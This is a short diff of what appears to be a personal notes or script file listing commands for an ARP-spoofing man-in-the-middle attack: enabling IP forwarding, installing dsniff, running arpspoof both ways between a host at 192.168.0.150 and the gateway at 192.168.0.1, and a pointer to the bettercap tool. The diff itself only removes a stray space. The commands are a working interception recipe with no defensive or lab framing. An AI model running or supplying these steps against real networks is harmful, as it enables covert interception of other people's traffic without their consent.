@@ -1,7 +1,7 @@
 sudo sysctl -w net.ipv4.ip_forward=1
 sudo apt install --assume-yes dsniff
 sudo arpspoof 192.168.0.150 -t 192.168.0.1
-sudo  arpspoof 192.168.0.1 -t 192.168.0.150
+sudo arpspoof 192.168.0.1 -t 192.168.0.150
 
 https://github.com/bettercap/bettercap
 bettercap
